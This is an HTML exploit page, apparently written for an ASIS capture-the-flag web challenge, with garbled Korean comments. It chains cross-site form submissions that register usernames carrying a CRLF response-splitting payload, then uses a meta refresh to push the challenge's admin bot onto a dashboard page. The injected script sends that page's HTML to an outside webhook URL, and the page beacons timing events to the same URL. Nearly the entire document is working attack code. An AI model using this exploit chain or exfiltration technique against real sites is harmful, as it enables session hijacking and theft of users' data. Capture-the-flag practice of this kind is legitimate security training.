<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Redirecting...</title>
    <!-- 
        í•µì‹¬ ì „ëµ:
        1. Playwrightì˜ page.goto()ëŠ” Meta refreshë¥¼ ë”°ë¼ê°
        2. 7ì´ˆ í›„ dashboardë¡œ redirect
        3. ì´ë•Œ ë´‡ì´ ì´ë¯¸ ë¡œê·¸ì¸ ì™„ë£Œ ìƒíƒœ
        4. page.goto()ê°€ dashboard ë¡œë“œë¥¼ ê¸°ë‹¤ë¦¼
        5. Dashboardì—ì„œ CRLF injection ë°œìƒ!
    -->
    <meta http-equiv="refresh" content="7;url=http://65.109.202.184/dashboard">
</head>
<body>
    <h1>Redirecting to dashboard...</h1>
    <p>Please wait 7 seconds...</p>
    
    <iframe name="reg_iframe" style="display:none;"></iframe>
    
    <script>
    var WEBHOOK = 'https://webhook.site/e6f5490e-7765-4cb7-a32e-efd8dbbb4b81';
    
    // === CRLF Payload ===
    var crlfPayload = 
        "\r\n" +
        "Content-Length: 0\r\n" +
        "\r\n" +
        "HTTP/1.1 200 OK\r\n" +
        "Content-Type: text/html\r\n" +
        "\r\n" +
        "<html><body>" +
        "<h1>CRLF INJECTION SUCCESS!</h1>" +
        "<script>" +
        "setTimeout(function(){" +
        "var data = {" +
        "  html: document.documentElement.innerHTML," +
        "  body: document.body.innerHTML," +
        "  text: document.body.textContent" +
        "};" +
        "fetch('" + WEBHOOK + "', {" +
        "  method: 'POST'," +
        "  headers: {'Content-Type': 'application/json'}," +
        "  body: JSON.stringify(data)" +
        "});" +
        "}, 1000);" +
        "</scr" + "ipt>" +
        "</body></html>";
    
    // === ê°€ëŠ¥í•œ FLAG í˜•ì‹ ===
    var flags = [
        'ASIS{bookmarks}',
        'ASIS{bookmark}',
        'ASIS{crlf}',
        'ASIS{http_response_splitting}',
        'ASIS{response_splitting}',
        'ASIS{header_injection}',
        'ASIS{xss}',
        'ASIS{admin}',
        'ASIS{bot}',
        'ASIS{csrf}'
    ];
    
    // === ì¦‰ì‹œ CRLF ê³„ì • ë“±ë¡ ===
    console.log('[+] Registering CRLF accounts...');
    
    flags.forEach(function(flagName, index) {
        setTimeout(function() {
            var form = document.createElement('form');
            form.method = 'POST';
            form.action = 'http://65.109.202.184/register';
            form.target = 'reg_iframe';
            
            var username = document.createElement('input');
            username.name = 'username';
            username.value = flagName + crlfPayload;
            
            var password = document.createElement('input');
            password.name = 'password';
            password.value = 'password';
            
            form.appendChild(username);
            form.appendChild(password);
            document.body.appendChild(form);
            form.submit();
            
            console.log('[+] Registered:', flagName);
        }, index * 100);
    });
    
    // === ì‹ í˜¸: ë“±ë¡ ì™„ë£Œ ===
    setTimeout(function() {
        navigator.sendBeacon(WEBHOOK, 'STEP1: All CRLF accounts registered');
        console.log('[+] All registrations sent');
    }, 2000);
    
    // === ëª¨ë“  ì´ë²¤íŠ¸ ì¶”ì  ===
    window.addEventListener('beforeunload', function() {
        navigator.sendBeacon(WEBHOOK, 'EVENT: beforeunload - page is leaving');
    });
    
    document.addEventListener('visibilitychange', function() {
        navigator.sendBeacon(WEBHOOK, 'EVENT: visibility changed to ' + document.visibilityState);
    });
    
    window.addEventListener('pagehide', function() {
        navigator.sendBeacon(WEBHOOK, 'EVENT: pagehide');
    });
    
    // === íƒ€ì„ë¼ì¸ ì¶”ì  ===
    setTimeout(function() {
        navigator.sendBeacon(WEBHOOK, 'TIMING: 5 seconds elapsed');
    }, 5000);
    
    setTimeout(function() {
        navigator.sendBeacon(WEBHOOK, 'TIMING: 7 seconds - Meta refresh should trigger now');
    }, 7000);
    
    setTimeout(function() {
        navigator.sendBeacon(WEBHOOK, 'TIMING: 10 seconds');
    }, 10000);
    
    // === ë´‡ íƒ€ì„ë¼ì¸ ì˜ˆìƒ ===
    // 0.0ì´ˆ: page.goto(ìš°ë¦¬_URL)
    // 0.5ì´ˆ: ìš°ë¦¬ í˜ì´ì§€ ë¡œë“œ, CRLF ê³„ì • ë“±ë¡
    // 5.0ì´ˆ: time.sleep(5) ì™„ë£Œ
    // 5.5ì´ˆ: page.goto('/register') - FLAG ë“±ë¡ ì‹œë„ (ì‹¤íŒ¨)
    // 6.5ì´ˆ: page.goto('/login') - FLAG ë¡œê·¸ì¸ (ì„±ê³µ! ìš°ë¦¬ ê³„ì •)
    // 7.0ì´ˆ: Meta refresh ë°œë™! â†’ Dashboardë¡œ redirect
    //        page.goto(ìš°ë¦¬_URL)ì´ ì•„ì§ ì§„í–‰ ì¤‘!
    //        Playwrightê°€ redirectë¥¼ ë”°ë¼ê°€ì„œ dashboard ë¡œë“œ!
    // 7.5ì´ˆ: Dashboard ë¡œë“œ ì™„ë£Œ
    //        X-User-{CRLF_FLAG} í—¤ë” ìƒì„±
    //        CRLF Injection ë°œìƒ!
    //        ìš°ë¦¬ JavaScript ì‹¤í–‰!
    //        FLAG ì¶”ì¶œ! ğŸ‰
    </script>
</body>
</html>
